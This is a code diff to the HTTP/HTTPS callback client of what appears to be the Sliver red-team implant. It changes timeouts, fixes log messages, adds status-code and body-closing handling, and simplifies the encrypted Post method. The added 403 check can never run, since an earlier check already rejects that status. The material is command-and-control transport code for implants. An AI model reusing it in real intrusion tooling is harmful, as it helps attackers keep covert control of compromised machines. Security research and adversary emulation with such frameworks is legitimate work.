@@ -28,7 +28,7 @@ import (
 )
 
 const (
-	defaultTimeout    = time.Second * 10
+	defaultNetTimeout = time.Second * 60
 	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
 )
 
@@ -99,7 +99,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	pubKeyBlock, _ := pem.Decode(data)
 	if pubKeyBlock == nil {
 		// {{if .Debug}}
-		log.Printf("failed to parse certificate PEM")
+		log.Printf("Failed to parse certificate PEM")
 		// {{end}}
 		return nil
 	}
@@ -107,14 +107,14 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
 	if certErr == nil {
 		// {{if .Debug}}
-		log.Printf("[http] Go a valid public key")
+		log.Printf("[http] Got a valid public key")
 		// {{end}}
 		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
 		return cert.PublicKey.(*rsa.PublicKey)
 	}
 
 	// {{if .Debug}}
-	log.Printf("Invalid certificate %v", err)
+	log.Printf("[http] Invalid certificate %v", err)
 	// {{end}}
 	return nil
 }
@@ -132,7 +132,11 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	if err != nil {
 		return err
 	}
+	if resp.StatusCode != 200 {
+		return errors.New("send failed")
+	}
 	respData, _ := ioutil.ReadAll(resp.Body)
+	defer resp.Body.Close()
 	sessionID, err := GCMDecrypt(*s.SessionKey, respData)
 	if err != nil {
 		return err
@@ -158,17 +162,21 @@ func (s *SliverHTTPClient) Get(urlPath string) ([]byte, error) {
 		// {{end}}
 		return nil, err
 	}
-	if resp.StatusCode != 200 {
+	if resp.StatusCode != 200 && resp.StatusCode != 201 {
 		return nil, errors.New("Non-200 response code")
 	}
+	if resp.StatusCode == 403 {
+		return nil, errors.New("invalid session")
+	}
 	respData, _ := ioutil.ReadAll(resp.Body)
+	defer resp.Body.Close()
 	return GCMDecrypt(*s.SessionKey, respData)
 }
 
 // Post - Perform an HTTP POST request
-func (s *SliverHTTPClient) Post(urlPath string, data []byte) ([]byte, error) {
+func (s *SliverHTTPClient) Post(urlPath string, data []byte) error {
 	if s.SessionID == "" || s.SessionKey == nil {
-		return nil, errors.New("no session")
+		return errors.New("no session")
 	}
 	reqData, err := GCMEncrypt(*s.SessionKey, data)
 	reader := bytes.NewReader(reqData)
@@ -182,13 +190,12 @@ func (s *SliverHTTPClient) Post(urlPath string, data []byte) ([]byte, error) {
 		// {{if .Debug}}
 		log.Printf("[http] POST failed %v", err)
 		// {{end}}
-		return nil, err
+		return err
 	}
 	if resp.StatusCode != 200 {
-		return nil, errors.New("Non-200 response code")
+		return errors.New("send failed")
 	}
-	respData, _ := ioutil.ReadAll(resp.Body)
-	return GCMDecrypt(*s.SessionKey, respData)
+	return nil
 }
 
 func (s *SliverHTTPClient) toURL(urlPath string) string {
@@ -214,9 +221,9 @@ func httpClient(address string) *SliverHTTPClient {
 func httpsClient(address string) *SliverHTTPClient {
 	var netTransport = &http.Transport{
 		Dial: (&net.Dialer{
-			Timeout: defaultTimeout,
+			Timeout: defaultNetTimeout,
 		}).Dial,
-		TLSHandshakeTimeout: defaultTimeout,
+		TLSHandshakeTimeout: defaultNetTimeout,
 	}
 	return &SliverHTTPClient{
 		Origin: fmt.Sprintf("https://%s", address),
